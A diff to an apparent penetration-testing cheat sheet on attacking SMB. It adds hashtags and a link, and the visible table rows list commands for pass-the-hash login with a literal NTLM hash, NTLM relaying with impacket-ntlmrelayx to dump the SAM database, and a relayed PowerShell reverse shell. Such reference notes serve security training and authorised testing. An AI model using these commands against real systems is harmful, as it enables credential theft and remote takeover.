@@ -1,4 +1,10 @@
 
+---
+
+#SMB #AttackingSMB #PenTest #Cybersecurity #smbclient #smbmap #rpcclient #enum4linux #CrackMapExec #Impacket #NullSession #PassTheHash #NTLMRelayAttack #RedTeam #HackingTools
+
+---
+
 ## Attacking SMB
 
 | **Command**                                                                                                     | **Description**                                                       |
@@ -18,3 +24,6 @@
 | `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`                            | Use the Pass-The-Hash technique to authenticate on the target host.   |
 | `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`                                            | Dump the SAM database using `impacket-ntlmrelayx`.                    |
 | `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`. |
+
+
+**[[SQL]]**
